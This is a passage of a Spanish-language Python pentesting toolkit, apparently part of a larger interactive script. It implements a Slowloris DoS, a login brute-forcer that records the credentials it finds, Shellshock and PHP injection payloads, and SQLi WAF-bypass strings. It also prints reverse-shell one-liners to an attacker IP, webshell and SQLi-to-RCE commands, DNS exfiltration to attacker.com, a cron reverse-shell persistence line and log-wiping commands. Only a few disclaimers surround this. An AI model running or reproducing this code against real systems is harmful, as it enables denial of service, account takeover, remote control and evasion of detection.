    confirmacion = input(f"\n{Colors.YELLOW}[?] ¿Estás SEGURO? (escribe 'SI-DOS'): {Colors.END}")
    if confirmacion != 'SI-DOS':
        print(f"{Colors.RED}[!] Operación cancelada{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}[*] Preparando pruebas de DoS controladas...{Colors.END}")
    
    # Opciones de ataque
    print(f"\n{Colors.CYAN}[+] Selecciona tipo de prueba DoS:{Colors.END}")
    print(f"  1. Slowloris (conexiones lentas)")
    print(f"  2. HTTP Flood (múltiples requests)")
    print(f"  3. Recursive GET (profundidad)")
    print(f"  4. Resource Exhaustion")
    
    try:
        tipo = int(input(f"{Colors.YELLOW}[?] Tipo (1-4): {Colors.END}"))
        
        if tipo == 1:
            slowloris_attack(objetivo)
        elif tipo == 2:
            http_flood_attack(objetivo)
        elif tipo == 3:
            recursive_get_attack(objetivo)
        elif tipo == 4:
            resource_exhaustion_attack(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def slowloris_attack(objetivo):
    """Ataque Slowloris controlado"""
    print(f"\n{Colors.GREEN}[*] Iniciando Slowloris controlado...{Colors.END}")
    
    num_connections = 100  # Limitado para prueba
    timeout = 30  # Segundos
    
    print(f"{Colors.CYAN}[+] Configuración:{Colors.END}")
    print(f"  Conexiones: {num_connections}")
    print(f"  Duración: {timeout} segundos")
    print(f"  Objetivo: {objetivo}")
    
    input(f"\n{Colors.YELLOW}[?] Presiona Enter para comenzar...{Colors.END}")
    
    sockets = []
    start_time = time.time()
    
    try:
        # Crear conexiones
        for i in range(num_connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                dominio = urlparse(objetivo).netloc
                sock.connect((dominio, 80))
                
                # Enviar request incompleto
                request = f"GET / HTTP/1.1\r\nHost: {dominio}\r\n"
                sock.send(request.encode())
                sockets.append(sock)
                
                print(f"  {Colors.GREEN}✓{Colors.END} Conexión {i+1} establecida")
                
            except Exception as e:
                print(f"  {Colors.RED}✗{Colors.END} Error conexión {i+1}: {str(e)[:30]}")
        
        # Mantener conexiones abiertas
        print(f"\n{Colors.CYAN}[+] Manteniendo conexiones abiertas...{Colors.END}")
        
        while time.time() - start_time < timeout:
            time.sleep(1)
            
            # Enviar headers para mantener conexión
            for i, sock in enumerate(sockets):
                try:
                    sock.send(b"X-a: b\r\n")
                except:
                    print(f"  {Colors.RED}✗{Colors.END} Conexión {i+1} perdida")
                    sockets[i] = None
            
            # Filtrar conexiones None
            sockets = [s for s in sockets if s is not None]
            
            if len(sockets) < num_connections * 0.5:
                print(f"  {Colors.YELLOW}[!] Menos del 50% de conexiones activas{Colors.END}")
                break
        
        # Cerrar conexiones
        print(f"\n{Colors.CYAN}[+] Cerrando conexiones...{Colors.END}")
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        elapsed = time.time() - start_time
        print(f"\n{Colors.GREEN}[+] Prueba completada en {elapsed:.1f} segundos{Colors.END}")
        print(f"  Conexiones máximas: {num_connections}")
        print(f"  Conexiones finales: {len(sockets)}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Prueba interrumpida por usuario{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error en prueba: {e}{Colors.END}")
    finally:
        # Asegurar cierre de sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    print(f"\n{Colors.YELLOW}[!] Análisis de resultados:{Colors.END}")
    print(f"  {Colors.CYAN}•{Colors.END} Si el servicio sigue respondiendo: Resistente a Slowloris básico")
    print(f"  {Colors.CYAN}•{Colors.END} Si el servicio se cayó: Vulnerable a DoS")
    print(f"  {Colors.CYAN}•{Colors.END} Recomendación: Implementar timeouts y límites de conexión")

def fuerza_bruta_avanzada(objetivo):
    """Fuerza bruta avanzada con múltiples vectores"""
    print(f"\n{Colors.GREEN}[*] Preparando fuerza bruta avanzada...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Vectores de ataque disponibles:{Colors.END}")
    print(f"  1. Login forms (usuarios/contraseñas)")
    print(f"  2. API keys/Token brute force")
    print(f"  3. Directory/file brute force")
    print(f"  4. Subdomain brute force (ya implementado)")
    print(f"  5. Parameter fuzzing")
    
    try:
        vector = int(input(f"{Colors.YELLOW}[?] Vector (1-5): {Colors.END}"))
        
        if vector == 1:
            brute_force_login(objetivo)
        elif vector == 2:
            brute_force_api_keys(objetivo)
        elif vector == 3:
            brute_force_directorios(objetivo)
        elif vector == 4:
            fuerza_bruta_subdominios(objetivo)  # Ya implementado
        elif vector == 5:
            parameter_fuzzing(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def brute_force_login(objetivo):





    """Fuerza bruta de formularios de login"""
    print(f"\n{Colors.GREEN}[*] Configurando fuerza bruta de login...{Colors.END}")
    
    # Obtener información del login
    login_url = input(f"{Colors.CYAN}[?] URL de login (ej: /login, /wp-login.php): {Colors.END}").strip()
    if not login_url.startswith('/'):
        login_url = '/' + login_url
    
    username_param = input(f"{Colors.CYAN}[?] Parámetro de usuario (ej: username, email, user): {Colors.END}").strip() or 'username'
    password_param = input(f"{Colors.CYAN}[?] Parámetro de contraseña (ej: password, pass, pwd): {Colors.END}").strip() or 'password'
    
    # Cargar listas de usuarios y contraseñas
    print(f"\n{Colors.CYAN}[+] Cargando listas de ataque...{Colors.END}")
    
    usuarios = []
    contrasenas = []
    
    # Listas básicas integradas
    usuarios_comunes = ['admin', 'administrator', 'root', 'test', 'user', 'guest', 'admin@admin.com']
    contrasenas_comunes = ['admin', 'password', '123456', 'admin123', 'test', 'password123', 'qwerty']
    
    # Intentar cargar desde archivos
    try:
        with open('usuarios.txt', 'r') as f:
            usuarios = [line.strip() for line in f.readlines()[:50]]
        print(f"  {Colors.GREEN}✓{Colors.END} Lista de usuarios cargada ({len(usuarios)} usuarios)")
    except:
        usuarios = usuarios_comunes
        print(f"  {Colors.YELLOW}[!] Usando lista de usuarios por defecto{Colors.END}")
    
    try:
        with open('contrasenas.txt', 'r') as f:
            contrasenas = [line.strip() for line in f.readlines()[:100]]
        print(f"  {Colors.GREEN}✓{Colors.END} Lista de contraseñas cargada ({len(contrasenas)} contraseñas)")
    except:
        contrasenas = contrasenas_comunes
        print(f"  {Colors.YELLOW}[!] Usando lista de contraseñas por defecto{Colors.END}")
    
    total_intentos = len(usuarios) * len(contrasenas)
    print(f"  {Colors.CYAN}[+] Total de intentos: {total_intentos}{Colors.END}")
    
    if total_intentos > 1000:
        print(f"  {Colors.YELLOW}[!] Muchos intentos, esto puede tomar tiempo...{Colors.END}")
    
    delay = float(input(f"{Colors.CYAN}[?] Delay entre intentos (segundos, 0 para rápido): {Colors.END}") or "0.5")
    
    encontradas = []
    intentos = 0
    
    print(f"\n{Colors.CYAN}[+] Iniciando fuerza bruta...{Colors.END}")
    
    for usuario in usuarios:
        for contrasena in contrasenas:
            intentos += 1
            
            try:
                data = {
                    username_param: usuario,
                    password_param: contrasena
                }
                
                # También probar posibles campos adicionales
                if 'csrf' in login_url.lower() or 'token' in login_url.lower():
                    # Primero obtener token CSRF si es necesario
                    session = requests.Session()
                    response = session.get(f"{objetivo}{login_url}", verify=False, timeout=5)
                    
                    # Buscar token CSRF en el HTML
                    soup = BeautifulSoup(response.text, 'html.parser')
                    csrf_input = soup.find('input', {'name': lambda x: x and 'csrf' in x.lower()})
                    if csrf_input:
                        data[csrf_input['name']] = csrf_input.get('value', '')
                
                response = requests.post(f"{objetivo}{login_url}", data=data, verify=False, timeout=10)
                
                # Indicadores de login exitoso
                login_exitoso = False
                
                if response.status_code in [200, 302, 303]:
                    # Verificar redirección después de login
                    if len(response.history) > 0:
                        login_exitoso = True
                    
                    # Verificar mensajes de error/success en la respuesta
                    contenido = response.text.lower()
                    if any(x in contenido for x in ['welcome', 'dashboard', 'logout', 'my account']):
                        login_exitoso = True
                    if any(x in contenido for x in ['invalid', 'incorrect', 'error', 'failed']):
                        login_exitoso = False
                    
                    # Verificar cookies de sesión
                    if 'session' in response.cookies or 'auth' in response.cookies:
                        login_exitoso = True
                
                if login_exitoso:
                    encontradas.append((usuario, contrasena))
                    print(f"\n{Colors.GREEN}[+] ¡CREDENCIALES ENCONTRADAS!{Colors.END}")
                    print(f"  Usuario: {usuario}")
                    print(f"  Contraseña: {contrasena}")
                    print(f"  Status: {response.status_code}")
                    
                    # Guardar credenciales
                    with open('credenciales_encontradas.txt', 'a') as f:
                        f.write(f"URL: {objetivo}\n")
                        f.write(f"Usuario: {usuario}\n")
                        f.write(f"Contraseña: {contrasena}\n")
                        f.write(f"Fecha: {datetime.now()}\n")
                        f.write("-" * 50 + "\n")
                
                print(f"  {Colors.CYAN}[{intentos}/{total_intentos}]{Colors.END} Probando: {usuario}:{contrasena} - {response.status_code}")
                
                time.sleep(delay)
                
            except Exception as e:
                print(f"  {Colors.RED}[!] Error: {str(e)[:50]}{Colors.END}")
                time.sleep(delay * 2)  # Mayor delay en error
    
    print(f"\n{Colors.GREEN}[+] Fuerza bruta completada{Colors.END}")
    print(f"  Intentos totales: {intentos}")
    print(f"  Credenciales encontradas: {len(encontradas)}")
    
    if encontradas:
        print(f"\n{Colors.YELLOW}[!] Siguiente paso CRÍTICO:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} VERIFICAR acceso con las credenciales")
        print(f"  {Colors.CYAN}2.{Colors.END} EXPLORAR permisos del usuario")
        print(f"  {Colors.CYAN}3.{Colors.END} BUSCAR información sensible")
        print(f"  {Colors.CYAN}4.{Colors.END} ESCALAR privilegios si es posible")
        print(f"  {Colors.CYAN}5.{Colors.END} NOTIFICAR inmediatamente al equipo de seguridad")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron credenciales válidas{Colors.END}")


# ============================
# FUNCIONES FALTANTES - AÑADIR DESPUÉS DE LA FUNCIÓN brute_force_login
# ============================

def explotacion_vulnerabilidades(objetivo):
    """Explotación de vulnerabilidades conocidas"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Explotación de vulnerabilidades...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Vulnerabilidades a explotar:{Colors.END}")
    print(f"  1. Shellshock (CVE-2014-6271)")
    print(f"  2. Heartbleed (CVE-2014-0160)")
    print(f"  3. MS17-010 (EternalBlue)")
    print(f"  4. Log4Shell (CVE-2021-44228)")
    print(f"  5. Spring4Shell (CVE-2022-22965)")
    
    try:
        vuln = int(input(f"{Colors.YELLOW}[?] Vulnerabilidad (1-5): {Colors.END}"))
        
        if vuln == 1:
            exploit_shellshock(objetivo)
        elif vuln == 2:
            exploit_heartbleed(objetivo)
        elif vuln == 3:
            exploit_eternalblue(objetivo)
        elif vuln == 4:
            exploit_log4shell(objetivo)
        elif vuln == 5:
            exploit_spring4shell(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def exploit_shellshock(objetivo):
    """Explotación de Shellshock"""
    print(f"\n{Colors.GREEN}[*] Probando Shellshock (CVE-2014-6271)...{Colors.END}")
    
    payloads = [
        "() { :;}; echo; echo; /bin/bash -c 'cat /etc/passwd'",
        "() { :;}; /bin/bash -c 'id'",
        "() { :;}; /bin/bash -c 'uname -a'",
    ]
    
    for payload in payloads:
        try:
            headers = {
                'User-Agent': payload,
                'Cookie': f"test={payload}",
                'Referer': payload
            }
            
            respuesta = requests.get(objetivo, headers=headers, verify=False, timeout=10)
            
            if 'root:' in respuesta.text:
                print(f"  {Colors.GREEN}✓{Colors.END} ¡Shellshock VULNERABLE!")
                print(f"     Payload: {payload[:50]}...")
                break
            else:
                print(f"  {Colors.RED}✗{Colors.END} Payload no funcionó")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Error: {str(e)[:50]}")

def exploit_heartbleed(objetivo):
    """Explotación de Heartbleed"""
    print(f"\n{Colors.GREEN}[*] Probando Heartbleed (CVE-2014-0160)...{Colors.END}")
    
    try:
        # Esta es una prueba básica - para explotación real se necesita una librería especializada
        import ssl
        
        contexto = ssl.create_default_context()
        dominio = urlparse(objetivo).netloc
        
        with socket.create_connection((dominio, 443), timeout=10) as sock:
            with contexto.wrap_socket(sock, server_hostname=dominio) as ssock:
                # Intentar enviar heartbeat malformado
                print(f"  {Colors.YELLOW}[!] Heartbleed requiere herramientas especializadas{Colors.END}")
                print(f"  {Colors.CYAN}[+] Usar:{Colors.END}")
                print(f"    • Metasploit: auxiliary/scanner/ssl/openssl_heartbleed")
                print(f"    • Nmap: nmap -sV --script ssl-heartbleed {dominio}")
                print(f"    • Python: pip install sslyze")
                
    except Exception as e:
        print(f"  {Colors.RED}[!] Error: {e}{Colors.END}")

def waf_bypass(objetivo):
    """Técnicas de bypass de WAF"""
    print(f"\n{Colors.GREEN}[*] Probando técnicas de bypass de WAF...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Técnicas disponibles:{Colors.END}")
    print(f"  1. Encoding de caracteres")
    print(f"  2. HTTP Parameter Pollution")
    print(f"  3. Wildcard bypass")
    print(f"  4. Unicode bypass")
    
    try:
        tecnica = int(input(f"{Colors.YELLOW}[?] Técnica (1-4): {Colors.END}"))
        
        if tecnica == 1:
            waf_encoding_bypass(objetivo)
        elif tecnica == 2:
            waf_hpp_bypass(objetivo)
        elif tecnica == 3:
            waf_wildcard_bypass(objetivo)
        elif tecnica == 4:
            waf_unicode_bypass(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def waf_encoding_bypass(objetivo):
    """Bypass de WAF mediante encoding"""
    print(f"\n{Colors.GREEN}[*] Probando bypass con encoding...{Colors.END}")
    
    # Payload SQLi con diferentes encodings
    payload_base = "admin' OR '1'='1'--"
    
    encodings = [
        ("URL encode", quote(payload_base)),
        ("Double URL encode", quote(quote(payload_base))),
        ("HTML entities", "admin&#39; OR &#39;1&#39;&#61;&#39;1&#39;--"),
        ("Unicode", "admin%u0027%20OR%20%u00271%u0027%u003d%u00271%u0027--"),
        ("Hex", "61646d696e27204f52202731273d2731272d2d"),
        ("Base64", base64.b64encode(payload_base.encode()).decode()),
    ]
    
    for nombre, payload in encodings:
        try:
            url = f"{objetivo}/login?username={payload}&password=test"
            respuesta = requests.get(url, verify=False, timeout=5)
            
            if respuesta.status_code == 200:
                print(f"  {Colors.YELLOW}?{Colors.END} {nombre}: Status {respuesta.status_code}")
                if 'welcome' in respuesta.text.lower():
                    print(f"     {Colors.GREEN}✓ Posible bypass exitoso{Colors.END}")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {nombre}: Blocked ({respuesta.status_code})")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} {nombre}: Error")

def code_injection_ataques(objetivo):
    """Ataques de inyección de código"""
    print(f"\n{Colors.GREEN}[*] Ataques de inyección de código...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Tipos de inyección:{Colors.END}")
    print(f"  1. PHP code injection")
    print(f"  2. Python eval() injection")
    print(f"  3. JavaScript injection")
    print(f"  4. Template injection")
    
    try:
        tipo = int(input(f"{Colors.YELLOW}[?] Tipo (1-4): {Colors.END}"))
        
        if tipo == 1:
            php_code_injection(objetivo)
        elif tipo == 2:
            python_code_injection(objetivo)
        elif tipo == 3:
            javascript_injection(objetivo)
        elif tipo == 4:
            template_injection(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def php_code_injection(objetivo):
    """Inyección de código PHP"""
    print(f"\n{Colors.GREEN}[*] Probando inyección PHP...{Colors.END}")
    
    payloads = [
        "'; phpinfo(); //",
        "\"; system('id'); //",
        "${@phpinfo()}",
        "<?php echo shell_exec('id'); ?>",
        "`id`",
    ]
    
    # Buscar parámetros potenciales
    parametros = ['cmd', 'code', 'eval', 'php', 'function', 'data']
    
    for param in parametros:
        for payload in payloads:
            try:
                url = f"{objetivo}/?{param}={quote(payload)}"
                respuesta = requests.get(url, verify=False, timeout=5)
                
                if 'uid=' in respuesta.text or 'gid=' in respuesta.text or 'php version' in respuesta.text.lower():
                    print(f"  {Colors.GREEN}✓{Colors.END} ¡PHP injection encontrado!")
                    print(f"     Parámetro: {param}")
                    print(f"     Payload: {payload}")
                    return
                    
            except Exception as e:
                continue
    
    print(f"  {Colors.RED}[-] No se encontró inyección PHP{Colors.END}")

def ataques_bases_datos(objetivo):
    """Ataques a bases de datos"""
    print(f"\n{Colors.GREEN}[*] Ataques a bases de datos...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Tipos de ataque:{Colors.END}")
    print(f"  1. NoSQL injection")
    print(f"  2. LDAP injection")
    print(f"  3. XPATH injection")
    print(f"  4. Database dumping")
    
    try:
        tipo = int(input(f"{Colors.YELLOW}[?] Tipo (1-4): {Colors.END}"))
        
        if tipo == 1:
            nosql_injection_attack(objetivo)
        elif tipo == 2:
            ldap_injection(objetivo)
        elif tipo == 3:
            xpath_injection(objetivo)
        elif tipo == 4:
            database_dumping(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def escalada_privilegios(objetivo):
    """Técnicas de escalada de privilegios"""
    print(f"\n{Colors.GREEN}[*] Técnicas de escalada de privilegios...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Escenarios:{Colors.END}")
    print(f"  1. Linux privilege escalation")
    print(f"  2. Windows privilege escalation")
    print(f"  3. Web application privilege escalation")
    print(f"  4. Database privilege escalation")
    
    try:
        escenario = int(input(f"{Colors.YELLOW}[?] Escenario (1-4): {Colors.END}"))
        
        if escenario == 1:
            linux_priv_esc(objetivo)
        elif escenario == 2:
            windows_priv_esc(objetivo)
        elif escenario == 3:
            webapp_priv_esc(objetivo)
        elif escenario == 4:
            database_priv_esc(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def linux_priv_esc(objetivo):
    """Escalada de privilegios en Linux"""
    print(f"\n{Colors.GREEN}[*] Comprobando vectores de escalada Linux...{Colors.END}")
    
    # Comandos para verificar posibles vectores
    comandos = [
        ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
        ("Sudo permissions", "sudo -l"),
        ("Cron jobs", "crontab -l"),
        ("World writable files", "find / -perm -2 -type f 2>/dev/null"),
        ("Kernel version", "uname -a"),
        ("Running processes", "ps aux"),
    ]
    
    print(f"{Colors.CYAN}[+] Comandos de verificación:{Colors.END}")
    for nombre, comando in comandos:
        print(f"  {Colors.YELLOW}•{Colors.END} {nombre}: {comando}")
    
    print(f"\n{Colors.YELLOW}[!] Estos comandos deben ejecutarse en una shell obtenida{Colors.END}")

def post_explotacion(objetivo):
    """Técnicas de post-explotación"""
    print(f"\n{Colors.GREEN}[*] Técnicas de post-explotación...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Actividades:{Colors.END}")
    print(f"  1. Information gathering")
    print(f"  2. Credential harvesting")
    print(f"  3. Network reconnaissance")
    print(f"  4. Data exfiltration")
    print(f"  5. Persistence")
    
    try:
        actividad = int(input(f"{Colors.YELLOW}[?] Actividad (1-5): {Colors.END}"))
        
        if actividad == 1:
            post_info_gathering(objetivo)
        elif actividad == 2:
            post_credential_harvesting(objetivo)
        elif actividad == 3:
            post_network_recon(objetivo)
        elif actividad == 4:
            post_data_exfiltration(objetivo)
        elif actividad == 5:
            post_persistence(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def post_info_gathering(objetivo):
    """Recolección de información post-explotación"""
    print(f"\n{Colors.GREEN}[*] Recolección de información...{Colors.END}")
    
    info_commands = [
        ("System info", "uname -a && cat /etc/*release"),
        ("User info", "id && whoami && w"),
        ("Network info", "ifconfig && netstat -tulpn && route"),
        ("Processes", "ps aux | head -20"),
        ("Crontabs", "crontab -l && ls -la /etc/cron*"),
        ("Installed packages", "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null"),
        ("Sensitive files", "find / -name '*.pem' -o -name '*.key' -o -name '*.db' 2>/dev/null | head -10"),
    ]
    
    print(f"{Colors.CYAN}[+] Comandos recomendados:{Colors.END}")
    for nombre, comando in info_commands:
        print(f"  {Colors.YELLOW}•{Colors.END} {nombre}:")
        print(f"     {comando}")

# ============================
# FUNCIONES DE EXPLOTACIÓN AVANZADA (FALTANTES)
# ============================

def command_reverse_shell(objetivo):
    """Reverse shell por command injection"""
    print(f"\n{Colors.GREEN}[*] Generando reverse shell por command injection...{Colors.END}")
    
    ip = input(f"{Colors.CYAN}[?] IP del atacante: {Colors.END}").strip()
    puerto = input(f"{Colors.CYAN}[?] Puerto: {Colors.END}").strip() or "4444"
    
    print(f"\n{Colors.CYAN}[+] Reverse shells por command injection:{Colors.END}")
    
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{puerto} 0>&1",
        "Netcat tradicional": f"nc -e /bin/sh {ip} {puerto}",
        "Netcat sin -e": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {puerto} >/tmp/f",
        "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{puerto}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{puerto});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={puerto};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{puerto}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }
    
    for nombre, comando in shells.items():
        print(f"\n{Colors.YELLOW}[+] {nombre}:{Colors.END}")
        print(f"  {comando}")
    
    print(f"\n{Colors.CYAN}[+] Uso:{Colors.END}")
    print(f"  1. Inicia netcat: nc -lvnp {puerto}")
    print(f"  2. Inyecta el comando en un parámetro vulnerable")
    print(f"  3. Ejemplo: ?cmd={quote(shells['Bash'])}")

def file_upload_reverse_shell(objetivo):
    """Reverse shell via file upload"""
    print(f"\n{Colors.GREEN}[*] Reverse shell por file upload...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Requisitos:{Colors.END}")
    print(f"  1. Encontrar vulnerabilidad de file upload")
    print(f"  2. Bypass filtros de archivo")
    print(f"  3. Subir shell malicioso")
    print(f"  4. Ejecutar shell")
    
    print(f"\n{Colors.YELLOW}[+] Técnicas de bypass:{Colors.END}")
    print(f"  • Cambiar extensión: shell.php → shell.php.jpg")
    print(f"  • Double extension: shell.php.jpg")
    print(f"  • Null byte: shell.php%00.jpg")
    print(f"  • Case sensitive: shell.PhP")
    print(f"  • Add headers: GIF89a; <?php system($_GET['cmd']); ?>")

def sqli_to_rce(objetivo):
    """SQL Injection to RCE"""
    print(f"\n{Colors.GREEN}[*] SQL Injection a RCE...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Métodos por DBMS:{Colors.END}")
    
    metodos = {
        "MySQL": [
            "INTO OUTFILE: SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/shell.php'",
            "INTO DUMPFILE: SELECT '<?php system($_GET[cmd]); ?>' INTO DUMPFILE '/var/www/shell.php'",
        ],
        "PostgreSQL": [
            "COPY TO: COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/shell.php'",
            "lo_export: SELECT lo_export('<?php system($_GET[cmd]); ?>', '/var/www/shell.php')",
        ],
        "MSSQL": [
            "xp_cmdshell: EXEC xp_cmdshell 'echo <?php system($_GET[cmd]); ?> > C:\\web\\shell.php'",
            "OLE Automation: DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT",
        ],
    }
    
    for dbms, tecnicas in metodos.items():
        print(f"\n{Colors.YELLOW}[+] {dbms}:{Colors.END}")
        for tecnica in tecnicas:
            print(f"  • {tecnica}")

def privilege_escalation_techniques(objetivo):
    """Técnicas de escalada de privilegios"""
    print(f"\n{Colors.GREEN}[*] Técnicas de escalada de privilegios...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Checklists:{Colors.END}")
    
    checklists = {
        "Linux": [
            "SUID/SGID binaries: find / -perm -4000 -o -perm -2000 2>/dev/null",
            "Sudo permissions: sudo -l",
            "Cron jobs: crontab -l; ls -la /etc/cron*",
            "World writable files: find / -perm -2 -type f 2>/dev/null",
            "Kernel exploits: uname -a; searchsploit kernel_version",
        ],
        "Windows": [
            "User privileges: whoami /priv",
            "Service permissions: accesschk.exe -uwcqv *",
            "AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            "Unquoted service paths: wmic service get name,pathname",
            "Weak service permissions: sc qc service_name",
        ],
    }
    
    for os_type, checks in checklists.items():
        print(f"\n{Colors.YELLOW}[+] {os_type}:{Colors.END}")
        for check in checks:
            print(f"  • {check}")

def lateral_movement(objetivo):
    """Movimiento lateral"""
    print(f"\n{Colors.GREEN}[*] Técnicas de movimiento lateral...{Colors.END}")
    
    tecnicas = [
        "Pass-the-Hash (Windows)",
        "Pass-the-Ticket (Kerberos)",
        "SSH key reuse",
        "Credential dumping (mimikatz, secretsdump.py)",
        "SMB relay attacks",
        "RDP hijacking",
    ]
    
    print(f"{Colors.CYAN}[+] Técnicas comunes:{Colors.END}")
    for tecnica in tecnicas:
        print(f"  {Colors.YELLOW}•{Colors.END} {tecnica}")
    
    print(f"\n{Colors.YELLOW}[+] Herramientas recomendadas:{Colors.END}")
    print(f"  • Impacket suite (psexec, wmiexec, smbexec)")
    print(f"  • Mimikatz (Windows credential dumping)")
    print(f"  • CrackMapExec (network exploitation)")

def data_exfiltration_methods(objetivo):
    """Métodos de exfiltración de datos"""
    print(f"\n{Colors.GREEN}[*] Métodos de exfiltración de datos...{Colors.END}")
    
    metodos = [
        "DNS exfiltration (usando consultas DNS)",
        "HTTP exfiltration (en requests HTTP)",
        "ICMP exfiltration (ping packets)",
        "FTP/SCP/SFTP transfer",
        "Cloud storage (AWS S3, Google Drive)",
        "Encrypted channels (SSH tunnel, VPN)",
    ]
    
    print(f"{Colors.CYAN}[+] Métodos:{Colors.END}")
    for metodo in metodos:
        print(f"  {Colors.YELLOW}•{Colors.END} {metodo}")
    
    print(f"\n{Colors.YELLOW}[+] Ejemplo DNS exfiltration:{Colors.END}")
    print(f"  • Data: echo 'data' | xxd -p")
    print(f"  • DNS query: dig {hex_data}.attacker.com")

def persistence_mechanisms(objetivo):
    """Mecanismos de persistencia"""
    print(f"\n{Colors.GREEN}[*] Mecanismos de persistencia...{Colors.END}")
    
    mecanismos = {
        "Linux": [
            "Cron jobs: echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"' | crontab -",
            "SSH keys: echo 'ssh-rsa KEY' >> ~/.ssh/authorized_keys",
            ".bashrc/.profile: echo 'malicious_command' >> ~/.bashrc",
            "Systemd service: crear servicio en /etc/systemd/system/",
        ],
        "Windows": [
            "Registry Run keys: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Scheduled tasks: schtasks /create /tn TaskName /tr 'malicious.exe'",
            "Services: sc create ServiceName binPath='malicious.exe'",
            "Startup folder: copy malicious.exe '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'",
        ],
    }
    
    for os_type, methods in mecanismos.items():
        print(f"\n{Colors.YELLOW}[+] {os_type}:{Colors.END}")
        for method in methods:
            print(f"  • {method}")

def covering_tracks(objetivo):
    """Cubriendo huellas"""
    print(f"\n{Colors.GREEN}[*] Cubriendo huellas...{Colors.END}")
    
    print(f"{Colors.RED}[!] NOTA: Esto es solo para propósitos educativos{Colors.END}")
    print(f"{Colors.RED}[!] En pruebas reales, documentar TODO sin alterar logs{Colors.END}")
    
    acciones = [
        "Linux logs: rm -f /var/log/auth.log /var/log/syslog",
        "History files: history -c; rm -f ~/.bash_history",
        "Web logs: rm -f /var/log/apache2/access.log",
        "Timestomping: touch -t 202301010000 file.txt",
        "Windows logs: wevtutil cl System; wevtutil cl Security",
    ]
    
    print(f"\n{Colors.CYAN}[+] Acciones comunes (NO RECOMENDADAS en pentests reales):{Colors.END}")
    for accion in acciones:
        print(f"  {Colors.YELLOW}•{Colors.END} {accion}")
    
    print(f"\n{Colors.RED}[!] En pentests éticos:{Colors.END}")
    print(f"  • NO borrar logs")
    print(f"  • NO modificar timestamps")
    print(f"  • Documentar todas las acciones")
    print(f"  • Dejar el sistema como se encontró")

def automated_exploitation(objetivo):
    """Explotación automatizada"""
    print(f"\n{Colors.GREEN}[*] Explotación automatizada...{Colors.END}")
    
    print(f"{Colors.CYAN}[+] Herramientas recomendadas:{Colors.END}")
    
    herramientas = [
        ("Metasploit", "Framework completo de explotación"),
        ("SQLmap", "Automatización de SQL injection"),
        ("Burp Suite", "Testing de aplicaciones web"),
